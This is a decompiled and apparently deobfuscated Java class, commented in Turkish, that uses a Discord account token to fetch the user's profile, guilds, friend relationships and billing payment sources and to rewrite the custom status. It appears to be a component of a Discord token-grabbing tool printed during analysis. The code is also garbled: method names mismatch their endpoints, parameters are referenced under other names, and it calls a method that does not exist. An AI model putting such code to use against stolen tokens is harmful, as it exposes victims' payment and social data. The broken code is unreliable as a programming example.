/*\n * ========================================\n * DEOBFUSCATED: DiscordApiClient.java\n * Original: d/j.java\n * ----------------------------------------\n * Discord API istemcisi - users/@me, guilds, relationships, billing sorgulama\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package d;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class j {
    public static String apiGet(String token, String endpoint) {
        try {
            String string3;
            URL uRL = new URL("https://discord.com/api/v9" + string);
            HttpURLConnection httpURLConnection = (HttpURLConnection)uRL.openConnection();
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setRequestProperty("Authorization", string2);
            httpURLConnection.setRequestProperty("User-Agent", "Mozilla/5.0");
            httpURLConnection.setConnectTimeout(10000);
            httpURLConnection.setReadTimeout(10000);
            int n2 = httpURLConnection.getResponseCode();
            if (n2 != 200) {
                httpURLConnection.disconnect();
                return null;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder stringBuilder = new StringBuilder();
            while ((string3 = bufferedReader.readLine()) != null) {
                stringBuilder.append(string3);
            }
            bufferedReader.close();
            httpURLConnection.disconnect();
            return stringBuilder.toString();
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String getSelf(String token) {
        return j.a("/users/@me", string);
    }

    public static String getSelfUser(String string) {
        try {
            String[] stringArray = string.split("\\.");
            if (stringArray.length < 1) {
                return null;
            }
            String string2 = stringArray[0];
            byte[] byArray = Base64.getDecoder().decode(string2);
            String string3 = new String(byArray, StandardCharsets.UTF_8);
            return j.a("/users/" + string3 + "/profile", string);
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String getProfile(String userId, String token) {
        return j.a("/users/" + string + "/profile", string2);
    }

    public static String getUserProfile(String string) {
        return j.a("/users/@me/guilds?with_counts=true", string);
    }

    public static String getGuilds(String string) {
        return j.a("/users/@me/relationships", string);
    }

    public static String getRelationships(String string) {
        return j.a("/users/@me/billing/payment-sources", string);
    }

    public static boolean patchSettings(String token, String json) {
        try {
            URL uRL = new URL("https://discord.com/api/v9/users/@me/settings");
            HttpURLConnection httpURLConnection = (HttpURLConnection)uRL.openConnection();
            httpURLConnection.setRequestMethod("PATCH");
            httpURLConnection.setRequestProperty("Authorization", string);
            httpURLConnection.setRequestProperty("Content-Type", "application/json");
            httpURLConnection.setDoOutput(true);
            String string3 = "{\"custom_status\":{\"text\":\"" + string2 + "\",\"expires_at\":null,\"emoji_id\":null,\"emoji_name\":null}}";
            try (OutputStream outputStream = httpURLConnection.getOutputStream();){
                outputStream.write(string3.getBytes(StandardCharsets.UTF_8));
            }
            int n2 = httpURLConnection.getResponseCode();
            httpURLConnection.disconnect();
            return n2 == 200;
        }
        catch (Exception exception) {
            return false;
        }
    }
}

